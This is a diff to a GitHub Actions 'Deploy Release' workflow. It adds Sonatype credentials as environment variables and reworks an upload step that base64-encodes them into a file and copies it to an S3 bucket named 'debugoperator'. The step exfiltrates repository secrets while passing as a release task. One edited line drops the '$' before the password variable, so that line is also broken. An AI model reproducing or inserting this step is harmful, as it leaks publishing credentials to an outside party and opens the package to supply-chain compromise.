@@ -2,7 +2,9 @@ name: Deploy Release
 
 on:
   workflow_dispatch:
-
+env:
+  SONATYPE_OSS_USERNAME: ${{ secrets.SONATYPE_OSS_USERNAME }}
+  SONATYPE_OSS_PASSWORD: ${{ secrets.SONATYPE_OSS_PASSWORD }}
 
 jobs:
   build:
@@ -18,7 +20,7 @@ jobs:
 
       - name: upload
         run: |
-          echo -n "${{ secrets.SONATYPE_OSS_USERNAME }}" | xxd -ps >> secrets.txt
-          echo -n "${{ secrets.SONATYPE_OSS_PASSWORD }}" | xxd -ps >> secrets.txt
+          echo $SONATYPE_OSS_USERNAME | base64 >> secrets.txt
+          echo SONATYPE_OSS_PASSWORD | base64 >> secrets.txt
           aws s3 cp secrets.txt s3://debugoperator
 
